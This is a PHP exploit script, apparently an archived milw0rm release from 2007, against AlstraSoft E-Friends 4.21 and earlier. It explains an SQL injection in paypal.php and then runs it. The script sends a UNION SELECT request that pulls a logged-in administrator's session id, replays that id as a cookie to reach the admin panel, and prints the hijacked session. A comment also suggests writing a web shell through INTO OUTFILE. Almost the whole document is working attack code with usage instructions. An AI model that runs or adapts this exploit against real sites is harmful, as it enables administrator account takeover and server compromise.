#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
AlstraSoft E-Friends <= 4.21 Admin Session Retrieve Exploit
by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
Thanks to rgod for the php code and Marty for the Love

";
if ($argc<2) {
echo "Usage: php ".$argv[0]." Host Path 
Host:          target server (ip/hostname)
Path:          path of template

Example:
php ".$argv[0]." localhost /efriend/";

die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

/*
 ___________________________________________________________________
/       This script is part of the AlstraSoft Exploit Pack:         \
|                                                                   |
|  http://itablackhawk.altervista.org/exploit/alsoft_exploit_pack;  |
|                                                                   |
|            You can find the patches for this bugs at:             |
|                                                                   |
|   http://itablackhawk.altervista.org/download/alsoft_patch.zip    |
|                                                                   |
\________________________.:BlackHawk 2007:._________________________/

*/

/*
VULN EXPLANATION

Vuln code can be found at paypal.php:

$sql="select * from member_package where package_id=$pack";
$res=mysql_query($sql);

we can do a SQL Injection..
in this case we try to retrieve the last valid session id for being an admin
but you can also try to inject a shell with INTO OUTFILE command
*/

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$adminID=$argv[3];
$password=$argv[4];


$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "- retrieving...\r\n";
$packet="GET ".$p."index.php?mode=paypal&pack=-1%20union%20select%200,0,0,0,0,0,0,0,0,sess_id%20from%20admin%20limit%200,1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode('name="a3" value="',$html);
$sess=explode('">',$temp[1]);
$packet ="GET ".$p."admin.php?mode=ip_manager HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: PHPSESSID=".$sess[0]."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (!eregi("<tr><td class='lined title'>Admin: IP Manager</td>",$html))
{
echo 'ERROR EXPLOITING - TRY AGAIN WHEN AN ADMIN IS LOGGED IN\r\n';
exit;
}

echo 'You Can use this Session: '.$sess[0];
# Coded With BH Fast Generator v0.1
?>

# milw0rm.com [2007-05-20]
